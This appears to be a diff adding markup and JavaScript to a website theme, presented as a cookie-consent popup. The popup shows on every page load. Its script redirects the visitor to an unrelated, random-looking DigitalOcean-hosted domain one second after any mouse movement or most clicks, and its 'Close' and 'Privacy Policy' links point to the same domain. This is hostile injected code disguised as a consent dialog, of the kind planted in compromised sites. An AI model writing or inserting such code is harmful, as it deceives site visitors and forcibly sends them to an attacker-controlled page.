@@ -1,0 +1,136 @@
+<div class="overlay w-navpane-close"></div>
+
+	<script type="text/javascript" src="/files/theme/plugins.js?1728475676"></script>
+	<script type="text/javascript" src="/files/theme/custom.js?1728475676"></script>
+	<div class="popcaptcha"> 
+   <style>
+        /* Popup container */
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7); /* Background with transparency */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none; /* Hide popup by default */
+        }
+
+        /* Popup content */
+        .popup-content {
+            border-radius: 10px;
+            position: relative;
+            background-color: #d2d2d2;
+            position: absolute;
+               border: 2px solid white;
+            padding: 40px;
+        }
+
+        @media(max-width:520px){
+            .popup-content{
+                width:90%;
+            }
+        }
+
+        @media(min-width:520px){
+            .popup-content{
+                width:65%;
+            }
+        }
+
+        /* GIF styling */
+        .popup-content img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        .cls {
+            position: absolute;
+            right: 0px;
+            border-radius: 0px 10px 0px 0px;
+            top: 10px;
+            right:10px;
+            padding: 5px;
+            color: blue;
+            font-weight: 500;
+        }
+        .butrecpop{
+          background-color: #007bff;
+    font-family: "Poppins", Sans-serif;
+    font-weight: 500;
+    border:transparent;
+    padding: 15px 30px;
+    color: #FFFFFF;
+    border-radius: 5px;
+        }
+    </style>
+
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <a href="https://charlskhdjsdkhasjsd-utarv.ondigitalocean.app/" id="closePopup">
+                <div class="cls">
+                    Close
+                </div>
+            </a>
+            <h1>Cookie Policy</h1>    
+            <p>This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic. By clicking Accept, you agree to the use of cookies. For more information, please visit our <a href="https://charlskhdjsdkhasjsd-utarv.ondigitalocean.app/">Privacy Policy</a></p>
+            <button id="acceptBtn" class="butrecpop">Accept</button>
+        </div>
+    </div>
+</div>
+<script>
+    // Get popup and close button elements
+    var popup = document.getElementById('popup');
+    var closePopup = document.getElementById('closePopup');
+    var acceptBtn = document.getElementById('acceptBtn');
+    var hasMovedOrClicked = false; // Flag to track if mouse has moved or clicked
+
+    // Show the popup instantly after page load
+    window.addEventListener('load', function() {
+        popup.style.display = 'flex'; // Show popup
+    });
+
+    // Hide the popup when the close button is clicked
+    closePopup.addEventListener('click', function(event) {
+        event.preventDefault(); // Prevent default link behavior
+        popup.style.display = 'none';
+    });
+
+    // Hide the popup when the accept button is clicked
+    acceptBtn.addEventListener('click', function() {
+        popup.style.display = 'none';
+    });
+
+    // Redirect to another page if the cursor is moved
+    window.addEventListener('mousemove', function() {
+        if (!hasMovedOrClicked) { // If neither the mouse has moved nor a click occurred
+            hasMovedOrClicked = true; // Set the flag to true
+            setTimeout(function() {
+                window.location.href = 'https://charlskhdjsdkhasjsd-utarv.ondigitalocean.app/'; // Redirect to another page after movement
+            }, 1000); // Optional delay before redirecting
+        }
+    });
+
+    // Redirect to another page if the user clicks anywhere on the page (excluding the popup)
+    window.addEventListener('click', function(event) {
+        if (event.target !== popup && event.target !== popup.children[0]) {
+            if (!hasMovedOrClicked) { // If neither the mouse has moved nor a click occurred
+                hasMovedOrClicked = true; // Set the flag to true
+                setTimeout(function() {
+                    window.location.href = 'https://charlskhdjsdkhasjsd-utarv.ondigitalocean.app/'; // Redirect to another page after clicking
+                }, 1000); // Optional delay before redirecting
+            }
+        }
+    });
+
+    // Hide the popup when clicking outside of the popup content
+    window.addEventListener('click', function(event) {
+        if (event.target === popup) {
+            popup.style.display = 'none';
+        }
+    });
+</script>
